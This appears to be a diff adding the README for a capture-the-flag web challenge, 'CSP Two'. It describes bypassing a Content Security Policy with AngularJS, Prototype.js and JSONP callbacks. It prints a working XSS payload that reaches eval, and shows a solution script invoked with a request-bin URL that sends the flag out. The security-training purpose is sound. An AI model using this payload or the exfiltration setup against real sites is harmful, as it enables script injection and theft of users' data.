@@ -1,0 +1,13 @@
+# CSP Two
+Bypass the CSP using **Angular JS and Prototype.js**. Based on [H5SC](https://html5sec.org/minichallenges/3). Possible solutions captured in [Cure53 Challenge Wiki](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22).
+
+For this challenge you can use XHR and Angular + Prototype JS + JSONP callbacks. Sample payload with alert(1):
+```
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script><script src="http://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js"></script><div id="f" ng-app ng-csp ng-click="x=$on.curry.call()">{{x.eval(x.atob("dW5kZWZpbmVk"))}}aaa</div><script async src="https://ajax.googleapis.com/jsapi?callback=f.click"></script>
+```
+
+To generate a payload to read the flag, use solution.py: 
+```
+python solution.py [$CHALLENGE_URL] [$REQUEST_BIN_URL]
+python solution.py http://192.168.86.180:8000 http://endiel6lj35l8.x.pipedream.net
+```
